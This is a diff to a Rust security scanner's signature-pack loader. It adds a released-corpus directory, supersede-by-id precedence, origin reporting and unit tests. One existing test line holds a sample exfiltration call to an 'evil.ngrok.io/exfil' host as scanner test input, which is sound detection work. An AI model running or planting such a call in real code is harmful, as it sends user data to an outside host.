@@ -112,8 +112,12 @@ fn pack_has_signature(raw: &str) -> bool {
 pub fn load_all_packs() -> Result<Vec<SignaturePack>, String> {
     let mut packs: Vec<SignaturePack> = Vec::new();
 
-    // 1. Embedded packs (always available; not signature-verified — their
-    //    integrity is guaranteed by the binary build process).
+    // 1. Embedded packs — the bootstrap corpus.
+    //
+    // These are not signature-verified: their integrity comes from the binary
+    // build. They guarantee a working scanner on first run, offline, and in
+    // air-gapped environments, and they are the floor a released corpus is
+    // measured against.
     for raw in EMBEDDED_PACKS {
         match serde_json::from_str::<SignaturePack>(raw) {
             Ok(pack) => packs.push(pack),
@@ -125,9 +129,108 @@ pub fn load_all_packs() -> Result<Vec<SignaturePack>, String> {
         }
     }
 
-    // 2. User-installed packs from ~/.sigil/packs/
+    // 2. The released core corpus from ~/.sigil/corpus/, when present.
+    //
+    // ADR-0005 committed to signature updates becoming data-plane — shipped
+    // and versioned independently of the binary. Embedding the core packs at
+    // compile time meant a rule change still required a release. A pack here
+    // supersedes the embedded pack with the same `meta.id`, so the corpus can
+    // move at its own cadence while the binary stays put.
+    //
+    // Signature verification applies (see `verify_pack_if_keyed`): a released
+    // corpus is exactly the thing an attacker would want to substitute.
+    if let Some(corpus_dir) = released_corpus_dir() {
+        let released = load_packs_from_dir(&corpus_dir)?;
+        for pack in released {
+            supersede(&mut packs, pack);
+        }
+    }
+
+    // 3. User-installed packs from ~/.sigil/packs/ (org rules, the optional
+    //    GPL LOLBin bundle). These also supersede by id, so a team can pin a
+    //    replacement for a core pack rather than fighting it with
+    //    suppressions.
     if let Some(user_packs) = user_packs_dir() {
-        packs.extend(load_packs_from_dir(&user_packs)?);
+        for pack in load_packs_from_dir(&user_packs)? {
+            supersede(&mut packs, pack);
+        }
+    }
+
+    Ok(packs)
+}
+
+/// Replace any existing pack with the same `meta.id`, otherwise append.
+///
+/// Superseding by id rather than merging keeps the active rule set
+/// unambiguous: exactly one pack answers for a given id, so the corpus digest
+/// recorded in scan output identifies precisely what ran.
+fn supersede(packs: &mut Vec<SignaturePack>, incoming: SignaturePack) {
+    if let Some(slot) = packs.iter_mut().find(|p| p.meta.id == incoming.meta.id) {
+        *slot = incoming;
+    } else {
+        packs.push(incoming);
+    }
+}
+
+/// Returns `~/.sigil/corpus/` — the released core corpus directory.
+pub fn released_corpus_dir() -> Option<PathBuf> {
+    dirs::home_dir().map(|h| h.join(".sigil").join("corpus"))
+}
+
+/// Where each active pack came from, for `sigil corpus`.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub enum PackOrigin {
+    /// Compiled into the binary.
+    Embedded,
+    /// Released corpus in `~/.sigil/corpus/`.
+    Released,
+    /// User-installed pack in `~/.sigil/packs/`.
+    User,
+}
+
+impl std::fmt::Display for PackOrigin {
+    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
+        f.write_str(match self {
+            PackOrigin::Embedded => "embedded",
+            PackOrigin::Released => "released",
+            PackOrigin::User => "user",
+        })
+    }
+}
+
+/// The active packs with their origin, in load order.
+///
+/// Mirrors `load_all_packs` so `sigil corpus` reports exactly what a scan
+/// would run, including which embedded packs have been superseded.
+pub fn load_all_packs_with_origin() -> Result<Vec<(SignaturePack, PackOrigin)>, String> {
+    let mut packs: Vec<(SignaturePack, PackOrigin)> = Vec::new();
+
+    for raw in EMBEDDED_PACKS {
+        if let Ok(pack) = serde_json::from_str::<SignaturePack>(raw) {
+            packs.push((pack, PackOrigin::Embedded));
+        }
+    }
+
+    let mut apply = |incoming: SignaturePack, origin: PackOrigin| {
+        if let Some(slot) = packs
+            .iter_mut()
+            .find(|(p, _)| p.meta.id == incoming.meta.id)
+        {
+            *slot = (incoming, origin);
+        } else {
+            packs.push((incoming, origin));
+        }
+    };
+
+    if let Some(dir) = released_corpus_dir() {
+        for pack in load_packs_from_dir(&dir)? {
+            apply(pack, PackOrigin::Released);
+        }
+    }
+    if let Some(dir) = user_packs_dir() {
+        for pack in load_packs_from_dir(&dir)? {
+            apply(pack, PackOrigin::User);
+        }
     }
 
     Ok(packs)
@@ -525,5 +628,73 @@ mod tests {
             r#"requests.get("https://evil.ngrok.io/exfil")"#,
             ""
         ));
+    }
+}
+
+#[cfg(test)]
+mod precedence_tests {
+    use super::*;
+    use crate::corpus::schema::{PackMeta, SignaturePack};
+
+    fn pack(id: &str, version: &str) -> SignaturePack {
+        SignaturePack {
+            meta: PackMeta {
+                id: id.to_string(),
+                name: id.to_string(),
+                version: version.to_string(),
+                updated_at: "2026-08-30".to_string(),
+                author: "test".to_string(),
+                description: "test".to_string(),
+            },
+            rules: Vec::new(),
+            provenance_rules: Vec::new(),
+        }
+    }
+
+    /// A released pack replaces the embedded pack with the same id, rather
+    /// than both being active. Exactly one pack must answer for an id, or the
+    /// corpus digest no longer identifies what ran.
+    #[test]
+    fn released_pack_supersedes_embedded_by_id() {
+        let mut packs = vec![
+            pack("sigil-core-credentials", "1.0.0"),
+            pack("other", "1.0.0"),
+        ];
+        supersede(&mut packs, pack("sigil-core-credentials", "2.0.0"));
+
+        assert_eq!(packs.len(), 2, "supersede must replace, not append");
+        let creds = packs
+            .iter()
+            .find(|p| p.meta.id == "sigil-core-credentials")
+            .expect("pack present");
+        assert_eq!(creds.meta.version, "2.0.0");
+    }
+
+    #[test]
+    fn unknown_id_is_appended() {
+        let mut packs = vec![pack("a", "1.0.0")];
+        supersede(&mut packs, pack("b", "1.0.0"));
+        assert_eq!(packs.len(), 2);
+    }
+
+    #[test]
+    fn embedded_corpus_is_the_bootstrap_floor() {
+        // With no released or user packs on this machine, load_all_packs must
+        // still return a working corpus — offline and air-gapped use.
+        let packs = load_all_packs().expect("embedded packs load");
+        assert!(
+            packs.len() >= EMBEDDED_PACKS.len(),
+            "expected at least the embedded packs, got {}",
+            packs.len()
+        );
+        assert!(packs.iter().any(|p| !p.rules.is_empty()));
+    }
+
+    #[test]
+    fn origins_are_reported_for_every_active_pack() {
+        let packs = load_all_packs_with_origin().expect("load");
+        assert!(!packs.is_empty());
+        // Nothing installed in the test environment, so all should be embedded.
+        assert!(packs.iter().all(|(_, o)| *o == PackOrigin::Embedded));
     }
 }
